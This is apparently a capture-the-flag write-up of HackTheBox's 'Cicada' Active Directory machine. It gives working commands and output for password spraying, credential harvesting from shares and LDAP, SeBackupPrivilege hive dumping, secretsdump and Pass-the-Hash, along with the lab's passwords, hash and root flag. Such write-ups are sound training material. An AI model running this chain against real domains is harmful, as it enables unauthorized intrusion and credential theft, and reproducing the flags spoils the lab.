---
title: "Cicada"
published: 2026-08-17
description: "Guest SMB access leaks a default password in an HR notice, a password spray lands michael.wrightson, an AD description field leaks david.orelious's password, a backup script leaks emily.oscars's creds, then SeBackupPrivilege abuse to dump SAM/SYSTEM for a Pass-the-Hash to Administrator"
tags: ["Active Directory", "Password Spraying", "SeBackupPrivilege", "Pass-the-Hash", "Windows", "Privesc"]
category: HackTheBox
draft: false
---

> [!info] Machine Info
> - **Target:** `10.129.56.23` (`CICADA-DC.cicada.htb`)
> - **Domain:** `cicada.htb`
> - **Difficulty:** Easy
> - **OS:** Windows Server 2022 (Domain Controller)

## Synopsis

Cicada is a beginner-friendly AD box, but it's a great example of how much damage plaintext credentials scattered across a domain can do. Guest SMB access exposes a default password sitting in an HR onboarding notice. A password spray with that default password lands one real account, which is just enough to enumerate the rest of the domain — where a second user has literally saved their password in their AD description field. That account leads to a third set of credentials hidden in a backup script, which finally gets me a WinRM shell. From there, `SeBackupPrivilege` lets me dump the SAM and SYSTEM hives directly, crack out the local Administrator's NTLM hash, and Pass-the-Hash my way to full compromise.

---

## 1. Recon

Standard opening move — full port sweep, then a version/script scan against what's open.

```bash
export target=10.129.56.23
nmap -p- $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 \
  -oN nmap_ports.txt && sleep 5 && nmap -sC -sV -vv -oN nmap_version.nmap $target
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-17 07:19:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Kerberos on 88, LDAP on 389/636/3268/3269, SMB on 445, WinRM on 5985 — another Domain Controller, hostname `CICADA-DC`, domain `cicada.htb`. I add it to my hosts file so name-based auth works cleanly for everything downstream:

```bash
sudo nano /etc/hosts
```

I keep one big hosts file across all my HTB boxes, so I just appended the new entry and reloaded it with `sponge` rather than editing in place each time:

```bash
sudo apt install moreutils
cat hosts /etc/hosts | sudo sponge /etc/hosts
```

There's no web service exposed, so with an AD box like this the natural next step is SMB.

---

## 2. Testing Anonymous / Guest Access

I always check the cheapest option first: does anything respond to a null session, and if not, does Guest work?

```bash
netexec smb $target -u '' -p '' --users
netexec ldap $target -u '' -p '' --users
netexec smb $target -u '' -p '' --rid-brute
```

```
SMB    10.129.56.23  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB    10.129.56.23  445  CICADA-DC  [+] cicada.htb\:
LDAP   10.129.56.23  389  CICADA-DC  [-] Error in searchRequest -> operationsError: ... a successful bind must be completed on the connection.
SMB    10.129.56.23  445  CICADA-DC  [-] Error connecting: LSAD SessionError: STATUS_ACCESS_DENIED
```

Null auth gets me a session but access is denied for anything meaningful — the RID brute-force against an empty user comes back `STATUS_ACCESS_DENIED`. So I tried the same thing as `guest`:

```bash
netexec smb $target -u 'guest' -p '' --rid-brute
```

```
SMB  10.129.56.23  445  CICADA-DC  [+] cicada.htb\guest:
SMB  10.129.56.23  445  CICADA-DC  500: CICADA\Administrator (SidTypeUser)
SMB  10.129.56.23  445  CICADA-DC  501: CICADA\Guest (SidTypeUser)
SMB  10.129.56.23  445  CICADA-DC  502: CICADA\krbtgt (SidTypeUser)
SMB  10.129.56.23  445  CICADA-DC  512: CICADA\Domain Admins (SidTypeGroup)
SMB  10.129.56.23  445  CICADA-DC  513: CICADA\Domain Users (SidTypeGroup)
... (full list of built-in groups/aliases) ...
```

This time it works, and RID cycling dumps the full list of well-known groups and built-in accounts on the domain — useful for building a user list later, even without a proper `--users` query working yet.

I also confirmed what shares Guest can actually browse:

```bash
netexec smb $target -u 'guest' -p '' --shares
```

```
Share      Permissions     Remark
-----      -----------     ------
ADMIN$                     Remote Admin
C$                         Default share
DEV
HR         READ
IPC$       READ            Remote IPC
NETLOGON                   Logon server share
SYSVOL                     Logon server share
```

Most shares are locked down, but `HR` shows up as **READ** for Guest. That's the interesting one.

---

## 3. Guest Access to the HR Share — Leaked Default Password

I connected directly with `smbclient` to see what's sitting in there.

```bash
smbclient -U 'guest%' //$target/HR
```

```
smb: \> ls
  .                                   D        0  Thu Mar 14 12:29:09 2024
  ..                                  D        0  Thu Mar 14 12:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 17:31:48 2024
```

Pulled it down:

```bash
get "Notice from HR.txt"
```

```bash
cat Notice\ from\ HR.txt
```

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our
security protocols, it's essential that you change your default password to
something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

It's a welcome-to-the-company onboarding notice — and it includes the literal default password every new hire is supposed to change on first login. Classic AD misconfiguration: a shared, unchanged default password sitting in a world-readable share.

---

## 4. Password Spraying

A leaked default password is only useful if it still applies to a real account. Before I could spray it, I needed a real user list — the RID-brute output from earlier gives me that, so I filtered it down to just the SidTypeUser entries.

```bash
netexec smb $target -u 'guest' -p '' --rid-brute | grep "SidTypeUser" > users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
```

With a list of usernames in hand, I sprayed the leaked default password across all of them in one shot:

```bash
netexec smb $target -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

```
SMB  10.129.56.23  445  CICADA-DC  [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB  10.129.56.23  445  CICADA-DC  [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB  10.129.56.23  445  CICADA-DC  [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB  10.129.56.23  445  CICADA-DC  [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB  10.129.56.23  445  CICADA-DC  [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB  10.129.56.23  445  CICADA-DC  [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB  10.129.56.23  445  CICADA-DC  [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

Everything fails except one: `michael.wrightson` is still using the default password. New hires apparently don't always follow the onboarding instructions.

I checked whether this account could get me a shell directly over WinRM:

```bash
netexec winrm $target -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

```
WINRM  10.129.56.23  5985  CICADA-DC  [-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

No luck, access denied. So `michael.wrightson` isn't the finish line, but it's a real domain account — which means much better LDAP visibility than Guest ever gave me.

---

## 5. Enumerating Domain Users via LDAP — A Password in Plain Sight

With valid domain creds, I pulled the full user list over LDAP, including description fields:

```bash
netexec ldap $target -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

```
LDAP  10.129.56.23  389  CICADA-DC  [*] Enumerated 8 domain users: cicada.htb
LDAP  10.129.56.23  389  CICADA-DC  -Username-           -Last PW Set-        -BadPW-  -Description-
LDAP  10.129.56.23  389  CICADA-DC  Administrator        2024-08-26 20:08:03  1        Built-in account for administering the computer/domain
LDAP  10.129.56.23  389  CICADA-DC  Guest                2024-08-28 17:26:56  0        Built-in account for guest access to the computer/domain
LDAP  10.129.56.23  389  CICADA-DC  krbtgt               2024-03-14 11:14:10  1        Key Distribution Center Service Account
LDAP  10.129.56.23  389  CICADA-DC  john.smoulder        2024-03-14 12:17:29  1
LDAP  10.129.56.23  389  CICADA-DC  sarah.dantelia       2024-03-14 12:17:29  1
LDAP  10.129.56.23  389  CICADA-DC  michael.wrightson    2024-03-14 12:17:29  0
LDAP  10.129.56.23  389  CICADA-DC  david.orelious       2024-03-14 12:17:29  0  Just in case I forget my password is aRt$Lp#7t*VQ!3
LDAP  10.129.56.23  389  CICADA-DC  emily.oscars         2024-08-22 21:20:17  0
```

Eight domain users come back — and one of them, `david.orelious`, has a description field that reads: *"Just in case I forget my password is aRt$Lp#7t*VQ!3"*. People really do this. That's a second working credential handed straight to me.

```bash
netexec smb $target -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
```

```
SMB  10.129.56.23  445  CICADA-DC  [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```

Valid. WinRM again denies this account directly:

```bash
netexec winrm $target -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
```

```
WINRM  10.129.56.23  5985  CICADA-DC  [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```

But this account's SMB share access is worth checking, since it's clearly a step up from Guest and Michael.

```bash
netexec smb $target -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

```
Share      Permissions     Remark
-----      -----------     ------
DEV        READ
HR         READ
IPC$       READ            Remote IPC
NETLOGON   READ            Logon server share
SYSVOL     READ            Logon server share
```

Now `DEV` shows up as readable too, alongside `HR`, `NETLOGON`, and `SYSVOL`.

---

## 6. DEV Share — A Backup Script with Hardcoded Credentials

I connected to `DEV` and found `Backup_script.ps1` sitting there. Grabbed it and read it locally:

```bash
cat Backup_script.ps1
```

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

It's a PowerShell script that zips up `C:\smb` into `D:\Backup`, and to do that it authenticates as `emily.oscars` with a hardcoded plaintext password baked right into the script: `Q!3@Lp#M6b*7t*Vt`. Third leaked credential, same root cause every time — plaintext passwords left lying around instead of using a credential vault or managed service account.

```bash
netexec smb $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

```
SMB  10.129.56.23  445  CICADA-DC  [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt
```

Valid. And this time, WinRM actually works:

```bash
netexec winrm $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

```
WINRM  10.129.56.23  5985  CICADA-DC  [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

`(Pwn3d!)` — full PSRemoting session available. Before jumping into a shell I poked at a couple of NetExec's credential-dumping modules just to see what `emily.oscars` could reach remotely:

```bash
netexec smb $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --lsa
netexec smb $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --sam
```

Neither gave anything useful over the network directly (as expected — SAM/LSA dumping like this generally needs local admin rights, which I don't have remotely yet). Time to actually get a shell and check what privileges this account holds locally.

*(Side track: I also spun up a local BloodHound CE instance and ran a full collection with `david.orelious`'s creds, mostly out of habit to map the domain graph — though on this box the path forward turned out to be entirely privilege-based rather than ACL-based.)*

```bash
docker-compose pull && docker-compose up -d
netexec ldap $target -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --bloodhound --collection All --dns-server $target
docker-compose logs bloodhound | grep -i "Set To"
mv /home/daryx/.nxc/logs/CICADA-DC_10.129.56.23_2026-08-17_003334_bloodhound.zip .
```

---

## 7. Foothold — WinRM as emily.oscars

```bash
evil-winrm -i $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

That gets me a shell and the user flag under `C:\Users\emily.oscars.CICADA\Desktop`.

---

## 8. Privilege Escalation — Abusing SeBackupPrivilege

First thing in any Windows shell: check my own token privileges.

```powershell
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                 Description                     State
=============================  ==============================  =======
SeBackupPrivilege              Back up files and directories    Enabled
SeRestorePrivilege             Restore files and directories    Enabled
SeShutdownPrivilege            Shut down the system              Enabled
SeChangeNotifyPrivilege        Bypass traverse checking          Enabled
SeIncreaseWorkingSetPrivilege  Increase a process working set    Enabled
```

`emily.oscars` has `SeBackupPrivilege` and `SeRestorePrivilege` enabled. `SeBackupPrivilege` is meant for backup software — it lets its holder read *any* file on disk, bypassing normal DACL/ACL checks, specifically so backup jobs can copy files they otherwise wouldn't have permission to read. That includes the registry hives that hold every local account's password hash.

I used `reg save` to dump the SAM and SYSTEM hives to disk in a working directory:

```powershell
reg save hklm\sam sam
reg save hklm\system system
```

```
The operation completed successfully.
The operation completed successfully.
```

Then downloaded both back to my attacking machine through the Evil-WinRM session (typo and all — muscle memory fails occasionally):

```powershell
dowload system
```

```
The term 'dowload' is not recognized as the name of a cmdlet, function, script file, or operable program...
```

```powershell
download system
download sam
```

```
Info: Downloading C:\temp\system to system
Info: Download successful!
Info: Downloading C:\temp\sam to sam
Info: Download successful!
```

Both `sam` and `system` land locally.

---

## 9. Extracting the Administrator Hash

`SAM` on its own is encrypted — you need the boot key from `SYSTEM` to decrypt it. Impacket's `secretsdump` handles both in one pass when given the hives as local files:

```bash
impacket-secretsdump -system system -sam sam local
```

```
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

Out comes the full local SAM database, including the Administrator account's NTLM hash: `2b87e7c93a3e8a0ea4a581937016f341`. I don't need to crack this — NTLM hashes are directly usable for authentication via Pass-the-Hash.

---

## 10. Pass-the-Hash to Administrator

```bash
evil-winrm -i $target -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
ab09befae5975d73373514af9a11de4c
```

Straight into an administrative shell — no plaintext password needed. Full domain compromise.

---

---

#ActiveDirectory #HackTheBox #PasswordSpraying #SeBackupPrivilege #PassTheHash #WinRM #EvilWinRM #BloodHound #Easy #Writeup
